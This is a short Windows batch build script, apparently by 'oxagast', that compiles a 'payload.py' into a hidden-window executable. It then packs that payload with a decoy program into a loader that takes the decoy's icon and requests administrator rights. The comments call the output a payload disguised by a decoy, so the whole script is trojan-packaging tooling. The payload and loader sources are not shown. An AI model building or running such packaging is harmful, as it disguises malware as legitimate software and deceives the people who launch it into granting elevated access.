@echo off
REM Run this build script to generate taskserv.exe (which is the payload), then reroll it packaged
REM with the loader, which will also include your decoy program.  Final is stored in .\repacked\ dir.
REM Author: oxagast
REM Modified: 02/02/24
rmdir dist /S /Q
rmdir build /S /Q
pyinstaller.exe --windowed --noconsole --onefile --icon=ctfloader.ico --disable-windowed-traceback .\payload.py
copy "dist\payload.exe" ".\CTF Loader.exe"
pyinstaller.exe --add-binary="CTF Loader.exe;." --add-binary="decoy.exe;." --icon=decoy.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader.py
rmdir repacked /S /Q
mkdir repacked
copy dist\loader.exe .\repacked\repacked.exe
